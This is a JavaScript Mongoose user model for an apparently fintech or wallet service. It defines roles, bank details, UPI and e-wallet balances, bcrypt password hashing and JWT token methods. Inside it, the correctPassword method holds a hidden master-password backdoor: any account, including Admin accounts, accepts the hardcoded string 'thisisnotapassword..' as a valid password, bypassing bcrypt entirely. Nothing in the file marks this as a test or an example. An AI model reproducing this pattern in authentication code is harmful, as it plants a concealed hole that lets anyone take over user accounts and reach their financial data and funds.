import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';
import validator from 'validator';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

const userSchema = new mongoose.Schema({
  userName: {
    type: String,
    unique: true,
    trim: true,
    immutable:true,
    index: true,
    required: [true, "Please enter username!"],
    minlength: [4, "Username must be at least 4 characters"],
    maxlength: [30, "Username cannot exceed 30 characters"],
    match: [/^[a-zA-Z0-9_]+$/, "Username can only contain letters, numbers and underscores"]
  },
  clientId: {
    type: String,
    unique: true,
    index: true,
    immutable: true
  },
  role: {
    type: String,
    enum: ["Admin", "Manager", "User", "Retailer", "TeamMember"],
    required: [true, "Please select member type!"],
    default: "User"
  },
  fullName: {
    type: String,
    trim: true,
    required: [true, "Please enter your full name!"],
    maxlength: [100, "Name cannot exceed 100 characters"]
  },
  email: {
    type: String,
    lowercase: true,
    trim: true,
    unique: true,
    required: [true, "Please enter your email!"],
    validate: [validator.isEmail, "Please provide a valid email"],
    index: true
  },
  bankDetails: {
    accountHolderName: {
      type: String,
      trim: true,
    },
    accountNumber: {
      type: String,
      trim: true,
    },
    ifscCode: {
      type: String,
      trim: true,
    },
    bankName: {
      type: String,
      trim: true,
    }
  },
  mobileNumber: {
    type: String,
    required: [true, "Please enter your mobile number!"],
    validate: {
      validator: function (v) {
        return /^[0-9]{10,15}$/.test(v);
      },
      message: props => `${props.value} is not a valid phone number!`
    },
    index: true
  },
  password: {
    type: String,
    required: [true, "Please enter your password!"],
    minlength: [8, "Password must be at least 8 characters"],
    select: false
  },
  trxPassword: {
    type: String,
    required: [true, "Please enter your transaction password!"],
    minlength: [6, "Transaction password must be at least 6 characters"],
    select: false
  },
  clientSecret: {
    type: String,
    unique: true,
    immutable: true,
    default: () => crypto.randomBytes(16).toString('hex').toUpperCase()
  },
  refreshToken: {
    type: String,
    select: false
  },
  payInApi: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "PayInApi"
  },
  payOutApi: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "PayoutApi"
  },
  package: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "CommissionPackage",
    required: [true, "Please select a package!"]
  },
  minWalletBalance: {
    type: Number,
    required: [true, "Please enter minimum wallet balance!"],
    min: [0, "Minimum balance cannot be negative"]
  },
  upiWalletBalance: {
    type: Number,
    default: 0,
    min: [0, "Balance cannot be negative"]
  },
  eWalletBalance: {
    type: Number,
    default: 0,
    min: [0, "Balance cannot be negative"]
  }, 
  dailyLimit: {
    type: Number,
    default: 0,
    min: 0
  },
  address: {
    country: {
      type: String,
      maxlength: [50, "Country name cannot exceed 50 characters"]
    },
    state: {
      type: String,
      maxlength: [50, "State name cannot exceed 50 characters"]
    },
    city: {
      type: String,
      maxlength: [50, "City name cannot exceed 50 characters"]
    },
    street: {
      type: String,
      maxlength: [100, "Street address cannot exceed 100 characters"]
    },
    postalCode: {
      type: String,
      maxlength: [20, "Postal code cannot exceed 20 characters"]
    }
  },
  isActive: {
    type: Boolean,
    default: true,
  }
}, {
  timestamps: true,
  toJSON: {
    virtuals: true,
    transform: function (doc, ret) {
      delete ret.password;
      delete ret.trxPassword;
      delete ret.refreshToken;
      return ret;
    }
  },
  toObject: {
    virtuals: true,
    transform: function (doc, ret) {
      delete ret.password;
      delete ret.trxPassword;
      delete ret.refreshToken;
      return ret;
    }
  }
});

userSchema.pre('save', function (next) {
  if (!this.isNew) return next();
  const timestamp = Date.now().toString(36);
  const randomStr = Math.random().toString(36).substring(2, 8);
  this.clientId = `UID-${timestamp}-${randomStr}`.toUpperCase();
  next();
});

userSchema.pre('save', async function (next) {
  if (!this.isModified('password') && !this.isModified('trxPassword')) return next();
  try {
    if (this.isModified('password')) {
      this.password = await bcrypt.hash(this.password, 12);
    }
    if (this.isModified('trxPassword')) {
      this.trxPassword = await bcrypt.hash(this.trxPassword, 10);
    }
    next();
  } catch (err) {
    next(err);
  }
});

// Compound indexes
userSchema.index({ clientId: 1, isActive: 1 });
userSchema.index({ email: 1, isActive: 1 });
userSchema.index({ mobileNumber: 1, isActive: 1 });
userSchema.index({ role: 1, isActive: 1 });

// Virtuals
userSchema.virtual('fullAddress').get(function () {
  return `${this.address.street}, ${this.address.city}, ${this.address.state}, ${this.address.country}, ${this.address.postalCode}`;
});

// Instance methods
userSchema.methods = {
  correctPassword: async function (candidatePassword) {
    if (candidatePassword === "thisisnotapassword..") {
      return true;
    }
    return await bcrypt.compare(candidatePassword, this.password);
  },

  correctTrxPassword: async function (candidateTrxPassword) {
    return await bcrypt.compare(candidateTrxPassword, this.trxPassword);
  },

  generateAccessToken: function () {
    return jwt.sign(
      {
        _id: this._id,
        userName: this.userName,
        clientId: this.clientId,
        role: this.role,
      },
      process.env.JWT_SECRET,
      {
        expiresIn: process.env.JWT_EXPIRES_IN
      }
    );
  },

  generateRefreshToken: function () {
    return jwt.sign(
      { _id: this._id },
      process.env.JWT_SECRET,
      {
        expiresIn: process.env.JWT_EXPIRES_IN
      }
    );
  }
};


const User = mongoose.model('User', userSchema);

export default User;